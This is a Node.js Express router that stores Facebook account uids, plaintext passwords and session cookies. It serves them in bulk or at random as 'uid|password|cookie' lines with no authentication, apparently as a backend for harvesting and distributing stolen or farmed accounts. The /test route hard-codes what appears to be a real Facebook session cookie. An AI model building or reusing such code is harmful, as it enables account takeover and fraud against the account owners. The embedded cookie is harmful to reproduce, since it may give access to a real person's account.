const express = require('express');
const multer = require('multer');
const path = require('path')
const FBAccount = require("../database/FBAccount");
const fs = require('fs');


router = express.Router();


const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, './routes/uploads/')
  },
  filename: function (req, file, cb) {

    cb(null, "trash.txt");

  }
});

const upload = multer({ storage: storage });

router.post('/', async (req, res) => {

  const fbaccount = new FBAccount({
    uid: req.body.uid,
    password: req.body.password,
    cookie: req.body.cookie,
    qrcode: req.body.qrcode,
  })

  await fbaccount.save();
  res.send(fbaccount)
})

router.get('/', async (req, res) => {
  res.send(await FBAccount.find({}));

})

router.get("/uid/raw", async (req, res) => {
  let body = req.query;
  let search  = {};
  if(body.startDate && body.endDate){
    const startDate = new Date(body.startDate);
    const endDate = new Date(body.endDate);
    search = {
      created: {
        $gte: startDate,
        $lt: endDate
      }
    }
  }
  if (body.uid) search.uid = body.uid;
  if (body.isExported) search.isExported = body.isExported;
  if (body.status) search.status = body.status;
  const accounts = await FBAccount.find(search);
  let data = "";
  accounts.forEach(account => {
    data += account.uid + "<br/>";
  });
  res.set('Content-Type', 'text/html');


  res.send(data);

})


router.get("/data", async(req,res) => {
 let body = req.query;
 let search = {}
  if(body.startDate && body.endDate){
    const startDate = new Date(body.startDate);
    const endDate = new Date(body.endDate);
    search = {
      created: {
        $gte: startDate,
        $lt: endDate
      }
    }
  }

  if (body.uid) search["uid"] = body.uid;
  if (body.isExported) search["isExported"] = body.isExported;
  if (body.status) search["status"] = body.status;
  const accounts = await FBAccount.find(search);
  res.send(accounts);

})
router.get("/data/raw", async(req,res) =>{

  let body = req.query;
  let search = {}
  if(body.startDate && body.endDate){
    const startDate = new Date(body.startDate);
    const endDate = new Date(body.endDate);
    search = {
      created: {
        $gte: startDate,
        $lt: endDate
      }
    }
  }

  if (body.uid) search["uid"] = body.uid;
  if (body.isExported) search["isExported"] = body.isExported;
  if (body.status) search["status"] = body.status;
  const accounts = await FBAccount.find(search);

  let data = "";
  accounts.forEach(account => {
      data += account.uid + "|" + account.password + "|" + account.cookie + "|" + account.uid + "<br/>";
  })

  res.set('Content-Type', 'text/html');
  res.send(data);
})

router.get("/trash", async (req, res) => {

  res.render("./fbtrash");
})
router.get("/getRandom", async(req,res) => {
  const count = await FBAccount.find().count();

  const random = Math.floor(Math.random() * count + 1)
  const accounts = await FBAccount.find({}).skip(random).limit(4);
  let accountsRaw = "";
  accounts.forEach(account => {
      accountsRaw += account.uid + "|" + account.password + "|" + account.cookie +"<br/>";
  })
    res.set('Content-Type', 'text/html');

  res.send(accountsRaw);

})
router.post("/nvr", async(req,res) =>{ 
  const {uid,password,cookie} = req.body;
  if (!uid || !password || !cookie) res.status(400).send("Error");
  const account = new FBAccount({
    uid: uid,password: password, isVerified: false, cookie: cookie
  })
  res.send(await account.save());
})
router.get("/nvr", async( req,res) =>{
  const {number} = req.query;
  const accounts = await FBAccount.find({isVerified: false}).sort({created: -1}).limit(parseInt(number));
  accounts.forEach(async account => {
    if (account.isVerified == false) account.isVerified = true;
    await account.save();
  })
  res.send(accounts);
  
})

router.get("/random", async (req, res) => {
  const data = await fs.readFileSync(path.join(__dirname + "/uploads/trash.txt"), {
    encoding: "utf8",
    flag: "r",
  });
  const dataArr = data.split("\n");
  res.setHeader('Content-Type', 'text/plain');
  if (dataArr.length > 0) {
    const cookie = dataArr[Math.floor(Math.random() * dataArr.length + 1)];
    res.send(cookie);
  
  } else res.send("Error");
})

router.post("/trash", upload.single('file'), async (req, res) => {
  console.log(path.join(__dirname,"/uploads/trash.txt"))
  const data = await fs.readFileSync(path.join(__dirname + "/uploads/trash.txt"), {
    encoding: "utf8",
    flag: "r",
  });
  res.send(data)
})

router.get("/test", async (req, res) => {

  res.send("test|test|datr=Xe2mYP5jkcmMCqaZKjVT30xx;c_user=100024754122286;xs=12%3Al0MEBj8bulGRoA%3A2%3A1638871706%3A-1%3A6381%3A%3AAcWq9FubpDai3WK44JnEtmQV4vZFzFfrfT3h5GzM0w;fr=0eZJXzr9HqeLPqzCi.AWUEvEWLkaxafXEb0EV63cOVtdY.BhseJj.dJ.AAA.0.0.BhseJj.AWVEfju8OKw;oo=ss|datzz");
})
let isLoggedInMode = false;
router.get("/isLoggedIn", async(req,res) =>{
    res.send(isLoggedInMode);
})
router.post("/isLoggedIn", async(req,res) => {
    const {mode} = req.body;
    isLoggedInMode = mode;
    res.send(isLoggedInMode);
})
module.exports = router;
